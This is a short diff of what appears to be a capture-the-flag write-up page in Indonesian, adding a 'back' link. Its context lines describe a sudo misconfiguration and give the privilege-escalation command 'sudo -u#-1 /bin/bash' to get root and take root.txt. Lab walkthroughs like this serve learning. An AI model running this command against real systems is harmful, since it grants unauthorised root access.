@@ -85,6 +85,8 @@ user bisa melakukan (ALL, !root) /bin/bash [https://www.exploit-db.com/exploits/
 gunakan command sudo -u#-1 /bin/bash
 
 ambil root.txt
+
+[back](https://wilbertwiyanto.github.io/website/)
 </div>
 </body>
 </html>
